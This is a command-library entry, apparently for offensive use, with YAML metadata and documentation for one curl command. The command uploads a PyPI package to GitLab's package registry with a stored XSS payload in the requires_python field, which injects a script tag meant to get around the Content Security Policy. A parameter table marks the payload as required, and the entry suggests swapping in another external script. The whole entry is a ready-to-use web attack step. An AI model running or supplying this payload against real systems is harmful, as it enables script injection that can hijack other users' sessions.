---
id: cmd-upload-pypi-v1-bypass-856836
data: >-
  curl -v
  "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi"
  -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F
  name='package_csp_bypass' -F requires_python='"><script
  src=/vakzz-h1/public/-/raw/a/test.js>'
tags:
  - xss
  - csp-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:20.961Z'
verified: false
validated: true
submitted: true
---
# upload-pypi-version1-bypass

## Command

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_csp_bypass' -F requires_python='"><script src=/vakzz-h1/public/-/raw/a/test.js>'
```

## Description

Uploads version 1 of a PyPi package with the opening XSS payload for CSP bypass, injecting the start of a script src attribute.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output | No |
| URL | API endpoint | Yes |
| `-F content` | Package file | Yes |
| `-F requires_python=2.7` | Initial value (overridden) | No |
| `-F version=1` | Version number | Yes |
| `-F name` | Package name | Yes |
| `-F requires_python=payload` | Opening payload | Yes |

## Examples

### Basic Usage

As shown in command.

### Advanced Usage

Change src path to different external script.

## Expected Output

201 Created with version details.

## Related

- [[Related Procedure: Upload-Multi-Version-Packages-for-CSP-Bypass]]
